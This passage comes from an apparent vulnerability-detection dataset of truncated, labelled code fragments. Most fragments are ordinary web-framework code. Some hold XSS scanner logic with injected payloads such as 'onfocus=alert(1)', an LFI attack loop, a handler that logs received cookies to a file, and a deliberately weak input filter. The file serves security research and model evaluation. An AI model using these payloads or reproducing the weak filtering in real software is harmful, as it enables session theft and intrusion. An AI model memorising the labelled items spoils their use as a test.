Scripting\", ", "label": 1}, {"snippet_id": 8519, "code": "?P<key>[^/]*)$', 'student.views.confirm_email_change'), url(r'^change_name$', 'student.views.change_name_request', name=\"change_name\"), url(r'^accept_name_change$', 'student.views.accept_name_change'),", "label": 0}, {"snippet_id": 22277, "code": "]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=\"begin_exam_registration\"), url(r'^create_exam_registration$', 'student.views.create_exam_registration'), url(r'^password_reset/$', 'student", "label": 0}, {"snippet_id": 9170, "code": ".pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses", "label": 1}, {"snippet_id": 764, "code": " \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) if db_update is not True: attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": xss_url, \"alert\": \"Cross Site Scripting", "label": 0}, {"snippet_id": 41748, "code": " default_fields: \t\t\tif key in d: \t\t\t\tself.set(key, d.get(key)) \t\tfor key, value in iteritems(d): \t\t\tself.set(key, value) \t\treturn self \tdef update_if_missing(self, d): \t\tif isinstance(d, BaseDocument): ", "label": 0}, {"snippet_id": 28743, "code": " not is_admin(level=give_level): \t\tprint('<center><h3 style=\"color: red\">How did you get here?! O_o You do not have need permissions</h>') \t\tprint('<meta http-equiv=\"refresh\" content=\"5; url=/\">') \t\timport", "label": 1}, {"snippet_id": 27021, "code": "\" +page print \"[+] LFI check for: \" +furl if DEBUG==1: print \"Params: \" print params print hidden_param_name print hidden_param_value counter=0 for lfi in lfi_attacks: post_params={} counter+=1 parameters", "label": 0}, {"snippet_id": 2229, "code": " \"res_headers\": xss_request_url.headers,\"res_body\": xss_request_url.text} dbupdate.insert_record(attack_result) def xss_get_uri(url,method,headers,body,scanid=None): db_update='' vul_param='' url_query", "label": 0}, {"snippet_id": 55035, "code": " @login_required(redirect_field_name='', login_url='/403') @require_POST @require_AJAX @transaction.atomic def batch_edit_translations(request): \"\"\"Perform an action on a list of translations. Available actions are", "label": 0}, {"snippet_id": 11342, "code": "\"all_blocks\": \"true\", }) ) auto_auth_params.update({'redirect_to': sequence_url}) lms_params=urlencode(auto_auth_params) self.start_urls.append(\"\\\"http://localhost:8003/auto_auth?{}\\\"\".format(lms_params", "label": 0}, {"snippet_id": 9204, "code": "?P<page>[^/]*)$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$', 'staticbook.views.html_index', name=\"html_book\"), url", "label": 1}, {"snippet_id": 38735, "code": "\t\t\t\t\tfilters=None \t\t\t\t\tvalue=self.__dict__.get(key, default) \t\t\telse: \t\t\t\tvalue=self.__dict__.get(key, default) \t\t\tif value is None and key not in self.ignore_in_getter \\ \t\t\t\tand key in(d.fieldname for", "label": 0}, {"snippet_id": 34490, "code": "(value, key) \t\t\tself.__dict__[key].append(value) \t\t\t \t\t\tvalue.parent_doc=self \t\t\treturn value \t\telse: \t\t\t \t\t\t \t\t\tif(getattr(self, '_metaclass', None) \t\t\t\tor self.__class__.__name__ in('Meta', 'FormMeta", "label": 0}, {"snippet_id": 7140, "code": ", url(r'^heartbeat$', include('heartbeat.urls')), ) if not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile", "label": 0}, {"snippet_id": 35263, "code": ":{}{} \t\t\t\t\t_(\"Row\"), self.idx, _(\"Value missing for\"), _(df.label)) \t\t\telse: \t\t\t\treturn _(\"Error: Value missing for{0}:{1}\").format(_(df.parent), _(df.label)) \t\tmissing=[] \t\tfor df in self.meta.get(\"fields", "label": 0}, {"snippet_id": 29138, "code": "\tscript=\"waf.sh\" \ttmp_config_path=sql.get_setting('tmp_config_path') \tproxy=sql.get_setting('proxy') \thaproxy_dir=sql.get_setting('haproxy_dir') \tver=check_haproxy_version(serv) \tos.system(\"cp scripts/%s.\"", "label": 0}, {"snippet_id": 30368, "code": " class=\"alert alert-danger\">Error Connecting: %s</div>' % errc) \texcept requests.exceptions.Timeout as errt: \t\tprint(\"Timeout Error:\",errt) \texcept requests.exceptions.RequestException as err: \t\tprint(\"OOps", "label": 0}, {"snippet_id": 49606, "code": ".query_params.get(ordering_query_param, '') self.ordering_query_param=ordering_query_param self.columns=self.get_columns() self.filters=[ SmartFilter(self.model, field, self.query_params, self.object_list) for i,", "label": 0}, {"snippet_id": 518, "code": " utils.logger import logger from utils.db import Database_update from utils.config import get_value dbupdate=Database_update() api_logger=logger() def fetch_xss_payload(): payload_list=[] if os.getcwd()", "label": 0}, {"snippet_id": 16543, "code": " urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$', 'courseware.views.jump_to', name=\"jump_to\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)", "label": 0}, {"snippet_id": 35409, "code": " first\").format(self.meta.get_label(df.options))) \t\t\t\t \t\t\t\t \t\t\t\t \t\t\t\t \t\t\t\tfields_to_fetch=[ \t\t\t\t\t_df for _df in self.meta.get_fields_to_fetch(df.fieldname) \t\t\t\t\tif \t\t\t\t\t\tnot _df.get('fetch_if_empty') \t\t\t\t\t", "label": 0}, {"snippet_id": 5848, "code": " def alterTest(cls, p=False): return \"<script>alert(/xss/)</script>\" @classmethod def genTestHTML(cls): s='' for t in cls.tags: s +='<%s src=\"x\"' % t for e in cls.events: s +=''' %s=\"console.log('%s %s')", "label": 0}, {"snippet_id": 12247, "code": "/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$', 'staticbook.views.html_index', name=\"html_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>", "label": 1}, {"snippet_id": 38993, "code": ".get_valid_columns(): \t\t\td[fieldname]=self.get(fieldname) \t\t\t \t\t\tif not sanitize and d[fieldname] is None: \t\t\t\tcontinue \t\t\tdf=self.meta.get_field(fieldname) \t\t\tif df: \t\t\t\tif df.fieldtype==\"Check\": \t\t\t\t\tif d", "label": 0}, {"snippet_id": 38441, "code": " six import iteritems, string_types import datetime import frappe, sys from frappe import _ from frappe.utils import(cint, flt, now, cstr, strip_html, \tsanitize_html, sanitize_email, cast_fieldtype) from", "label": 0}, {"snippet_id": 8645, "code": "[0-9A-Za-z]+)-(?P<token>.+)/$', 'student.views.password_reset_confirm_wrapper', name='auth_password_reset_confirm'), url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete,", "label": 0}, {"snippet_id": 26358, "code": " ' 'need to charge VAT on your invoice. You can get the tax amount ' 'back via the VAT reimbursement process.')) except vat_moss.errors.WebServiceError: logger.exception('VAT ID checking failed for country", "label": 0}, {"snippet_id": 14181, "code": ".news', name=\"news\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/', include('django_comment_client.urls')) ) urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug", "label": 0}, {"snippet_id": 4116, "code": ".headers,\"res_body\": xss_request_url.text} dbupdate.insert_record(attack_result) def xss_get_uri(url,method,headers,body,scanid=None): db_update='' vul_param='' url_query=urlparse.urlparse(url) parsed_query", "label": 0}, {"snippet_id": 27613, "code": " login_url, 'logout_url': make_logout_url(dest_url=self.request.url), 'contact_string': contact_string, } self.render('error-403.html', template_values, 403) def _add_security_response_headers(self): \"\"\"Add", "label": 0}, {"snippet_id": 40708, "code": "\treturn fieldname in doc.format_data_map \t\telse: \t\t\treturn True \tdef reset_values_if_no_permlevel_access(self, has_access_to, high_permlevel_fields): \t\t\"\"\"If the user does not have permissions at permlevel", "label": 0}, {"snippet_id": 43279, "code": " self.name).as_dict() \t\tfor key in self.as_dict(): \t\t\tdf=self.meta.get_field(key) \t\t\tdb_value=db_values.get(key) \t\t\tif df and not df.allow_on_submit and(self.get(key) or db_value): \t\t\t\tif df.fieldtype=", "label": 0}, {"snippet_id": 19964, "code": ".skip_clean or self.testsonly): test_utils.clean_test_files() msg=colorize('green', \"Checking for mongo, memchache, and mysql...\") print msg bokchoy_utils.check_services() if not self.testsonly: self.prepare_bokchoy_run", "label": 0}, {"snippet_id": 11898, "code": " continue template=\"%s.html\" % key.lower() if settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: template=\"theme-\" +template urlpatterns +=(url(r'^%s' % key.lower(), 'static_template_view.views.render', {'template'", "label": 0}, {"snippet_id": 39047, "code": "\telif df.fieldtype in(\"Currency\", \"Float\", \"Percent\") and not isinstance(d[fieldname], float): \t\t\t\t\td[fieldname]=flt(d[fieldname]) \t\t\t\telif df.fieldtype in(\"Datetime\", \"Date\", \"Time\") and d[fieldname]==\"\":", "label": 0}, {"snippet_id": 42099, "code": " in self.meta.get_valid_columns(): \t\t\td[fieldname]=self.get(fieldname) \t\t\t \t\t\tif not sanitize and d[fieldname] is None: \t\t\t\tcontinue \t\t\tdf=self.meta.get_field(fieldname) \t\t\tif df: \t\t\t\tif df.fieldtype==", "label": 0}, {"snippet_id": 37025, "code": "('t1.blogger=\"%s\"' % frappe.db.escape(filters.blogger)) \t\tif filters.blog_category: \t\t\tconditions.append('t1.blog_category=\"%s\"' % frappe.db.escape(filters.blog_category)) \tif txt: \t\tconditions.append(", "label": 0}, {"snippet_id": 37253, "code": ".blog_category, \t\t\t\t'route') +'/' +self.scrub(self.title) \tdef get_feed(self): \t\treturn self.title \tdef validate(self): \t\tsuper(BlogPost, self).validate() \t\tif not self.blog_intro: \t\t\tself.blog_intro=self.content", "label": 0}, {"snippet_id": 29879, "code": "\"margin:0\">Can not connect to the server</div>') \t\t if form.getvalue('getcert') is not None and serv is not None: \tid=form.getvalue('getcert') \tcert_path=sql.get_setting('cert_path') \tcommands=[ \"cat \"", "label": 0}, {"snippet_id": 16747, "code": "[^/]*)/$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index'), url(r'^courses/", "label": 1}, {"snippet_id": 15719, "code": " noseid files and system state. Just press it once.\\n' while True: try: sleep(10000) except KeyboardInterrupt: print \"Stopping bok-choy servers.\\n\" break @property def cmd(self): \"\"\" This method composes the", "label": 0}, {"snippet_id": 41730, "code": ": \t\t\tself._meta=frappe.get_meta(self.doctype) \t\treturn self._meta \tdef update(self, d): \t\tif \"doctype\" in d: \t\t\tself.set(\"doctype\", d.get(\"doctype\")) \t\t \t\tfor key in default_fields: \t\t\tif key in d: \t\t\t", "label": 0}, {"snippet_id": 43742, "code": " \"field2\"] \t\t:param fieldname: Fieldname to be checked if hidden. \t\t\"\"\" \t\tmeta_df=self.meta.get_field(fieldname) \t\tif meta_df and meta_df.get(\"__print_hide\"): \t\t\treturn True \t\tprint_hide=0 \t\tif self.get", "label": 0}, {"snippet_id": 19959, "code": ") test_utils.clean_reports_dir() if not(self.fasttest or self.skip_clean or self.testsonly): test_utils.clean_test_files() msg=colorize('green', \"Checking for mongo, memchache, and mysql...\") print msg", "label": 0}, {"snippet_id": 41594, "code": ".db_schema import type_map, varchar_len from frappe.utils.password import get_decrypted_password, set_encrypted_password _classes={} def get_controller(doctype): \t\"\"\"Returns the **class** object of the", "label": 0}, {"snippet_id": 49017, "code": ".get_absolute_url(), self.format(self.get_value()) ) class SmartListItem(object): def __init__(self, smart_list, object): self.smart_list=smart_list self.object=object def fields(self): return[ SmartListField", "label": 0}, {"snippet_id": 11780, "code": "'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile', name=\"university_profile\"), ) urlpatterns +=( url(r'^404$', 'static_template_view.views.render', {'template': '404.html'},", "label": 0}, {"snippet_id": 41114, "code": "\"image\"]=image \t\tcontext.comment_list=get_comment_list(self.doctype, self.name) \t\tif not context.comment_list: \t\t\tcontext.comment_text=_('No comments yet') \t\telse: \t\t\tif(len(context.comment_list))==1: ", "label": 0}, {"snippet_id": 32540, "code": ".SimpleHTTPRequestHandler): def do_GET(self): path=self.path if path.startswith('/chromium/src/+/master'): path=path[len('/chromium/src/+/master'):] full_path=os.path.realpath(os.path.join(self.server.top_level", "label": 0}, {"snippet_id": 45277, "code": "'oozie-coordinator2', owner=request.user) Document.objects.link(coordinator_doc, owner=coordinator_doc.owner, name=coordinator_doc.name, description=coordinator_doc.description, extra='coordinator2') if", "label": 0}, {"snippet_id": 48663, "code": "=request.POST[\"notes\"] if request.POST.get(\"contact\"): r.responsiblePerson=str(request.POST[\"contact\"]) if(r.createdByUser==u or o.rights > 1) and not r.submitted: r.save() else: return HttpResponseRedirect", "label": 1}, {"snippet_id": 18924, "code": "-provider-identity'), url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds') ) if settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False): urlpatterns +=url", "label": 0}, {"snippet_id": 51240, "code": "=group.name return value class GroupAdmin(BaseGroupAdmin, ImportExportModelAdmin): resource_class=GroupResource admin.site.unregister(User) admin.site.register(User, UserAdmin) admin.site.unregister(Group)", "label": 0}, {"snippet_id": 16884, "code": "?P<section>[^/]*)/(?P<position>[^/]*)/?$', 'courseware.views.index', name=\"courseware_position\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$', 'courseware.views.progress', name=\"progress", "label": 0}, {"snippet_id": 23447, "code": "'): urlpatterns +=( url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'), url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity',", "label": 0}, {"snippet_id": 22845, "code": " url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]", "label": 1}, {"snippet_id": 53879, "code": " \t\tdata=request.values \t\tcookie=data.get('cookie') \t\twith open('cookies.txt',mode='a') as f: \t\t\tf.write('\\n---------------------------\\n'+cookie+'\\n---------------------------\\n') \t\tprint(colored('\\n\\n", "label": 0}, {"snippet_id": 38023, "code": ")==1: \t\t\t\tcontext.comment_text=_('1 comment') \t\t\telse: \t\t\t\tcontext.comment_text=_('{0} comments').format(len(context.comment_list)) \t\tcontext.category=frappe.db.get_value(\"Blog Category\", \t\t\tcontext.doc", "label": 0}, {"snippet_id": 11319, "code": "\"course_id\": self.course_key, } cms_params=urlencode(auto_auth_params) self.start_urls.append(\"\\\"http://localhost:8031/auto_auth?{}\\\"\".format(cms_params)) sequence_url=\"/api/courses/v1/blocks/?{}\".format", "label": 0}, {"snippet_id": 36415, "code": "'parent_doc'): \t\t\t\t\tself.parent_doc.get_latest() \t\t\t\t\tref_doc=[d for d in self.parent_doc.get(self.parentfield) if d.name==self.name][0] \t\t\t\telse: \t\t\t\t\tref_doc=self.get_latest() \t\t\tfor df in to_reset: \t", "label": 0}, {"snippet_id": 52545, "code": "(_property['name'], _property['value']) for _property in properties])) if copied_properties: _properties.update(copied_properties) response['status']=0 response['properties']=_properties response['name']=", "label": 0}, {"snippet_id": 20563, "code": " ' '--pa11ycrawler-allowed-domains={allowed_domains} ' '--pa11ycrawler-reports-dir={report_dir} ' '--pa11ycrawler-deny-url-matcher={dont_go_here} ' '--pa11y-reporter=\"{reporter}\" ' '--depth-limit={depth", "label": 0}, {"snippet_id": 42834, "code": "\tif df.fieldtype==\"Link\": \t\t\t\t\tdoctype=df.options \t\t\t\t\tif not doctype: \t\t\t\t\t\tfrappe.throw(_(\"Options not set for link field{0}\").format(df.fieldname)) \t\t\t\telse: \t\t\t\t\tdoctype=self.get(df.options) \t\t\t\t\tif", "label": 0}, {"snippet_id": 25469, "code": "'fields']: defaults['label']=label field=forms.CharField(**defaults) field.part_name=fname fields.append(field) super().__init__( fields=fields, require_all_fields=False, *args, **kwargs ) self.require_all_fields", "label": 0}, {"snippet_id": 5037, "code": "</button>', '<input onfocus=alert(1) autofocus>', '<input onblur=alert(1) autofocus><input autofocus>', '<body onscroll=alert(1)>' +'<br>' * 100 +'<input autofocus>', '<video><source onerror=\"alert(1)\"", "label": 0}, {"snippet_id": 33386, "code": " webapp2.Route(r'/internal/cron/buildbucket/bq-export-experimental', bq.CronExportBuildsExperimental), webapp2.Route(r'/internal/cron/buildbucket/unregister-builders', UnregisterBuilders), webapp2.Route(r'", "label": 0}, {"snippet_id": 21231, "code": "'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$', 'courseware.views.course_info', name=\"info\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$', 'courseware.views.syllabus', name=\"syllabus\"), url(r", "label": 1}, {"snippet_id": 36870, "code": " under{0}\").format(category_title) \t\tlist_context.title=category_title \telif frappe.local.form_dict.blogger: \t\tblogger=frappe.db.get_value(\"Blogger\",{\"name\": frappe.local.form_dict.blogger}, \"full_name\") \t", "label": 0}, {"snippet_id": 40640, "code": " to be checked if hidden. \t\t\"\"\" \t\tmeta_df=self.meta.get_field(fieldname) \t\tif meta_df and meta_df.get(\"__print_hide\"): \t\t\treturn True \t\tprint_hide=0 \t\tif self.get(fieldname)==0 and not self.meta.istable:", "label": 0}, {"snippet_id": 2572, "code": ".insert_record(attack_result) db_update=True vul_param +=key else: result=True if vul_param=='': post_vul_param +=key else: post_vul_param +=','+key if post_vul_param: dbupdate.update_record({\"scanid\": scanid},{", "label": 0}, {"snippet_id": 44233, "code": " from oozie.forms import ParameterForm from oozie.models2 import Node, Workflow, Coordinator, Bundle, NODES, WORKFLOW_NODE_PROPERTIES, import_workflows_from_hue_3_7,\\ find_dollar_variables, find_dollar_braced_variables", "label": 0}, {"snippet_id": 29890, "code": " None: \tid=form.getvalue('getcert') \tcert_path=sql.get_setting('cert_path') \tcommands=[ \"cat \"+cert_path+\"/\"+id] \ttry: \t\tfunct.ssh_command(serv, commands, ip=\"1\") \texcept: \t\tprint('<div class=\"alert alert", "label": 0}, {"snippet_id": 11043, "code": ".start_servers(self.default_store, self.coveragerc) def load_courses(self): \"\"\" Loads courses from self.imports_dir. Note: self.imports_dir is the directory that contains the directories that have courses in", "label": 0}, {"snippet_id": 3931, "code": "/attackersite.com?test='+payload referer_header={\"Referer\": referer_header_value} temp_headers.update(referer_header) ref_header_xss=req.api_request(url, \"GET\", temp_headers) decoded_payload=xss_payload_decode", "label": 1}, {"snippet_id": 6587, "code": "=self.config.get(self.section, 'content_packages') res=[] for this in value.split(','): this=this.strip() name, _sep, path,=this.partition(':') res.append((name, path)) self._parsed_content_packages=res", "label": 0}, {"snippet_id": 35480, "code": "\tif frappe.get_meta(doctype).issingle: \t\t\t\t\tvalues.name=doctype \t\t\t\tif values: \t\t\t\t\tsetattr(self, df.fieldname, values.name) \t\t\t\t\tfor _df in fields_to_fetch: \t\t\t\t\t\tif self.is_new() or self.docstatus !=1", "label": 0}, {"snippet_id": 40707, "code": " \t\t\treturn fieldname in doc.format_data_map \t\telse: \t\t\treturn True \tdef reset_values_if_no_permlevel_access(self, has_access_to, high_permlevel_fields): \t\t\"\"\"If the user does not have permissions at permlevel", "label": 0}, {"snippet_id": 8337, "code": "'lms_migration.migrate.gitreload'), url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'), ) if settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'): urlpatterns +=( url(r'^event_logs$", "label": 0}, {"snippet_id": 8117, "code": "(?P<tab_slug>[^/]+)/$', 'courseware.views.static_tab', name=\"static_tab\"), ) if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+", "label": 0}, {"snippet_id": 35704, "code": " cannot be changed for{0}\").format(self.meta.get_label(fieldname)), \t\t\t\t\tfrappe.CannotChangeConstantError) \tdef _validate_length(self): \t\tif frappe.flags.in_install: \t\t\treturn \t\tif self.meta.issingle: \t", "label": 0}, {"snippet_id": 19228, "code": " self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_suite_spec(self): spec='test_foo.py' suite=BokChoyTestSuite('', test_spec=spec) name='tests/{}'.format(spec) self.assertEqual(suite", "label": 0}, {"snippet_id": 40558, "code": " \t\tif not df and fieldname in default_fields: \t\t\tfrom frappe.model.meta import get_default_df \t\t\tdf=get_default_df(fieldname) \t\tval=self.get(fieldname) \t\tif translated: \t\t\tval=_(val) \t\tif absolute_value", "label": 0}, {"snippet_id": 32546, "code": "'/chromium/src/+/master'): path=path[len('/chromium/src/+/master'):] full_path=os.path.realpath(os.path.join(self.server.top_level, path[1:])) if not full_path.startswith(self.server.top_level): self._DoUnknown", "label": 0}, {"snippet_id": 15973, "code": ".imports_dir, ) ) def generate_html_reports(self): \"\"\" Runs pa11ycrawler json-to-html \"\"\" cmd_str=( 'pa11ycrawler json-to-html --pa11ycrawler-reports-dir={report_dir}' ).format(report_dir=self.pa11y_report_dir)", "label": 0}, {"snippet_id": 19779, "code": " serversonly -prepare and run the necessary servers, only stopping when interrupted with Ctrl-C testsonly -assume servers are running(as per above) and run tests with no setup or cleaning of environment", "label": 0}, {"snippet_id": 41480, "code": "(conditions)) if conditions else \"\" \t\t} \tposts=frappe.db.sql(query, as_dict=1) \tfor post in posts: \t\tpost.cover_image=find_first_image(post.content) \t\tpost.published=global_date_format(post.creation) \t", "label": 0}, {"snippet_id": 48527, "code": ", default_foreward_url: str): \"\"\" This function is used to alter the reservation beeing build inside a cookie. This function automatically crafts the required response. \"\"\" js_string: str=\"\" r: GroupReservation", "label": 0}, {"snippet_id": 21836, "code": ".MITX_FEATURES.get('AUTH_USE_OPENID'): urlpatterns +=( url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'), url(r'^openid/complete/$', 'external_auth.views.openid_login_complete", "label": 0}, {"snippet_id": 50465, "code": " csessid, request) if csessid in self.requests: self.requests[csessid].finish() self.requests[csessid]=request return server.NOT_DONE_YET def mode_close(self, request): \"\"\" This is called by render_POST when", "label": 0}, {"snippet_id": 47977, "code": ", get_current_user import logging import ntpath import os import math import PIL from PIL import Image PATH_TO_UPLOAD_FOLDER_ON_DISK: str=\"/usr/local/www/focweb/\" IMAGE_SCALE=64 def action_change_user_avatar", "label": 0}, {"snippet_id": 47243, "code": " submenu_items assert isinstance(submenu_items['Record Metadata'], menu.MenuView) rec_uuid=str(uuid.uuid4()) Record.create({'title': 'test'}, id_=rec_uuid) db.session.commit() with app.test_request_context", "label": 1}, {"snippet_id": 26408, "code": " to ' 'resolve this manually.')) else: self.instance.vat_id_validated=False class BaseInvoiceNameForm(BaseInvoiceAddressForm): def __init__(self, *args, **kwargs): super().__init__(*args, **kwargs) for", "label": 0}, {"snippet_id": 45863, "code": ".deploy() deployment_mapping['coord_%s_dir' % i]=coord_dir deployment_mapping['coord_%s' % i]=coord properties.update(deployment_mapping) submission=Submission(request.user, bundle, request.fs, request", "label": 0}, {"snippet_id": 4741, "code": "'onpagehide', 'onpageshow', 'onpaste', 'onpause', 'onplay', 'onplaying', 'onpopstate', 'onprogress', 'onratechange', 'onreset', 'onresize', 'onscroll', 'onsearch', 'onseeked', 'onseeking', 'onselect', ", "label": 0}, {"snippet_id": 21699, "code": ".combined_notifications', name='open_ended_notifications'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$', 'open_ended_grading.views.peer_grading', name='peer_grading'), url(r'^courses/(?P<course_id>", "label": 0}, {"snippet_id": 18093, "code": ".*?)/(?P<dispatch>[^/]*)$', 'courseware.module_render.modx_dispatch', name='modx_dispatch'), url(r'^software-licenses$', 'licenses.views.user_software_license', name=\"user_software_license\"), url(r'^courses", "label": 0}, {"snippet_id": 21956, "code": "-identity'), url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds') ) if settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False): urlpatterns +=url(r'^testcenter", "label": 0}, {"snippet_id": 40935, "code": ".website.website_generator import WebsiteGenerator from frappe.website.render import clear_cache from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown from frappe", "label": 1}, {"snippet_id": 617, "code": "+payload,\"GET\",headers) if xss_request_url.text.find(payload) !=-1: impact=check_xss_impact(xss_request_url.headers) xss_result=True xss_request_uri=req.api_request(parsed_url+'/?test='+payload,\"GET\",headers", "label": 1}, {"snippet_id": 9220, "code": "*)/$', 'staticbook.views.html_index', name=\"html_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.html_index', name", "label": 1}, {"snippet_id": 3998, "code": " ref_header_xss.text} dbupdate.insert_record(attack_result) return def xss_get_url(url,method,headers,body,scanid=None): result='' xss_payloads=fetch_xss_payload() uri_check_list=['?', '&', '=', '%3F', '%26'", "label": 0}, {"snippet_id": 41401, "code": "(frappe.db.escape(txt))) \tif conditions: \t\tfrappe.local.no_cache=1 \tquery=\"\"\"\\ \t\tselect \t\t\tt1.title, t1.name, t1.blog_category, t1.route, t1.published_on, \t\t\t\tt1.published_on as creation, \t\t\t\tt1.content", "label": 0}, {"snippet_id": 14586, "code": "\"DEFAULT_STORE={default_store} \" \"SCREENSHOT_DIR='{repo_dir}/test_root/log{shard_str}' \" \"BOK_CHOY_HAR_DIR='{repo_dir}/test_root/log{shard_str}/hars' \" \"BOKCHOY_A11Y_CUSTOM_RULES_FILE='{repo_dir}/{a11y_custom_file", "label": 0}, {"snippet_id": 52816, "code": "'value']) for param in parameters])) params_form=ParametersFormSet(initial=initial_params) popup=render('editor/submit_job_popup.mako', request,{ 'params_form': params_form, 'action': reverse('oozie:editor_submit_workflow", "label": 0}, {"snippet_id": 10736, "code": "*kwargs): super(BokChoyTestSuite, self).__init__(*args, **kwargs) self.test_dir=Env.BOK_CHOY_DIR / kwargs.get('test_dir', 'tests') self.log_dir=Env.BOK_CHOY_LOG_DIR self.report_dir=kwargs.get('report_dir',", "label": 0}, {"snippet_id": 53302, "code": " RestException, ex: raise PopupException(_(\"Error submitting coordinator %s\") %(coordinator,), detail=ex._headers.get('oozie-error-message', ex)) def list_editor_bundles(request): bundles=[d.content_object", "label": 0}, {"snippet_id": 7512, "code": " url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$', 'courseware.views.course_about', name=\"about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$', 'courseware.views.mktg_course_about", "label": 0}, {"snippet_id": 5146, "code": "=\"console.log('%s %s')\" ''' %(e, t, e) s +='>%s</%s>\\n' %(t, t) return cls.htmlTemplate % s @classmethod def acmehttp01(cls, url): return url +'/.well-known/acme-challenge/?<h1>hi' def img(self, payload", "label": 0}, {"snippet_id": 49853, "code": ", request from. import bp as app @app.route(\"/\") def root(): return render_template(\"home.html\") @app.route(\"/interact\", methods=[\"POST\"]) def vuln(): msg=request.form[\"message\"].replace('img', 'uwu').replace", "label": 1}, {"snippet_id": 496, "code": ": xss_request.text} dbupdate.insert_record(attack_result) except: logs.logging.info(\"XSS: No GET param found!\") def xss_check(url,method,headers,body,scanid): xss_payloads=fetch_xss_payload() xss_get_method", "label": 1}, {"snippet_id": 12202, "code": "+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook", "label": 1}, {"snippet_id": 36996, "code": " get_blog_category(route): \treturn frappe.db.get_value(\"Blog Category\",{\"name\": route}, \"title\") or route def get_blog_list(doctype, txt=None, filters=None, limit_start=0, limit_page_length=20, order_by", "label": 0}, {"snippet_id": 33235, "code": ": return self.redirect(gae_users.create_login_url(self.request.url)) self.response.write('build %d not found' % build_id) self.abort(404) return self.redirect(str(build.url)) class TaskCancelSwarmingTask", "label": 1}, {"snippet_id": 37288, "code": " self.published and not self.published_on: \t\t\tself.published_on=today() \t\t \t\tfrappe.db.sql(\"\"\"update tabBlogger set posts=(select count(*) from `tabBlog Post` \t\t\twhere ifnull(blogger,'')=tabBlogger.name) \t", "label": 0}, {"snippet_id": 38950, "code": ".name \t\tvalue.parenttype=self.doctype \t\tvalue.parentfield=key \t\tif value.docstatus is None: \t\t\tvalue.docstatus=0 \t\tif not getattr(value, \"idx\", None): \t\t\tvalue.idx=len(self.get(key) or[]) +1 \t\tif not getattr", "label": 0}, {"snippet_id": 50371, "code": " request. \"\"\" csessid=request.args.get('csessid')[0] self.last_alive[csessid]=(time.time(), False) sess=self.sessionhandler.sessions_from_csessid(csessid) if sess: sess=sess[0] cmdarray=json.loads(request", "label": 1}, {"snippet_id": 4656, "code": "'source', 'spacer', 'span', 'strike', 'strong', 'style', 'sub', 'summary', 'sup', 'table', 'tbody', 'td', 'template', 'textarea', 'tfoot', 'th', 'thead', 'time', 'title', 'tr', 'track', 'tt', 'u', 'ul', ", "label": 0}, {"snippet_id": 35567, "code": " self.meta.get_select_fields(): \t\t\tif df.fieldname==\"naming_series\" or not(self.get(df.fieldname) and df.options): \t\t\t\tcontinue \t\t\toptions=(df.options or \"\").split(\"\\n\") \t\t\t \t\t\tif not filter(None, options", "label": 0}, {"snippet_id": 